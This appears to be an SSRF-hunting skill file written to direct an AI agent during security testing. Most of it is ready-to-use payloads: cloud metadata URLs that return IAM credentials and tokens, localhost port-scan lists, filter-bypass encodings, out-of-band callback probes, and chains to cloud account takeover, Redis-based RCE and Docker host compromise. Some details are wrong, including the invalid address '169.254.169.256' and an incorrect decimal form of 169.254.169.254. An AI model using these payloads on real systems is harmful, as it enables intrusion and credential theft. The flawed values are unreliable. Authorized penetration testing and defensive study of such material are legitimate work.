---
name: hunt-ssrf
description: "Hunting skill for Server-Side Request Forgery (SSRF) vulnerabilities. Detection patterns, cloud metadata access, internal service discovery, blind SSRF with OOB, filter bypass techniques. Use when testing URL fetch, file download, webhook, proxy, or redirect functionality."
---

# Hunt: SSRF (Server-Side Request Forgery)

## Detection Patterns

### URL Parameter SSRF
```
?url=http://example.com
?page=http://internal:8080/admin
?file=file:///etc/passwd
?redirect=http://169.254.169.254/latest/meta-data/
```

Test vectors:
- Passive: `http://<collab>.oastify.com/x` — listen for callback
- Active: `http://169.254.169.254/latest/meta-data/` — cloud metadata
- Internal: `http://127.0.0.1:80`, `http://localhost:8080`, `http://[::1]:80`

### SSRF in File Fetch
```
/image?path=http://internal:3000/
/load?template=http://<collab>/test
```

### SSRF in Webhook / Callback
```
/webhook?url=http://internal:9200/
/callback?target=http://<collab>/x
```

### SSRF in PDF Generator
```
/html?url=http://169.254.169.256/  # note: .256 bypasses some filters
```

### Blind SSRF
No response visible but server makes request. Requires OOB collaborator.
Send payload → listen for DNS/HTTP callback → if received, SSRF confirmed.

## Cloud Metadata Endpoints

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
Header required: `Metadata-Flavor: Google`

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Header required: `Metadata: true`

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
```

## Internal Service Discovery

Port scan via SSRF:
```
http://localhost:22    # SSH
http://localhost:80    # HTTP
http://localhost:443   # HTTPS
http://localhost:3306  # MySQL
http://localhost:6379  # Redis
http://localhost:9200  # Elasticsearch
http://localhost:5432  # PostgreSQL
http://localhost:8080  # Common web
http://localhost:8443  # Common HTTPS alt
http://localhost:2375  # Docker
http://localhost:3000  # Common webapp
http://localhost:5000  # Flask/Express
```

## Filter Bypass Techniques

| Filter | Bypass |
|---|---|
| Block 127.0.0.1 | `localhost`, `[::1]`, `0.0.0.0`, `127.1`, `0x7f.0.0.1`, `2130706433` (decimal), `0177.0.0.01` (octal) |
| Block 169.254.169.254 | DNS rebinding (`169.254.169.254.nip.io`), redirect chains, IPv6 (`[fd00:ec2::254]`), AWS instance metadata via IP `169.254.169.254` (URL-encoded decimal `3980399619`) |
| Block private IPs | Use attacker-controlled domain with `A` record pointing to internal IP, HTTP redirect |
| Block `file://` | Use `file:///` once, double URL encode `%66%69%6c%65%3a%2f%2f` |
| Block `http:` | Use `gopher://`, `dict://`, `ftp://` protocols |

## Confirmation Gates
- DNS/HTTP callback received → confirmed
- Cloud metadata returned → confirmed + critical
- Internal service response shown → confirmed
- Timing differential (local host fast, external slow) → provisional

## Chain Templates
- SSRF + Cloud Metadata → AWS/GCP/Azure IAM credentials → cloud account compromise
- SSRF + Internal Redis (6379) → write SSH key → RCE on internal server
- SSRF + Docker API (2375) → container escape → host compromise
- Blind SSRF + Internal Elasticsearch (9200) → data exfiltration via timing
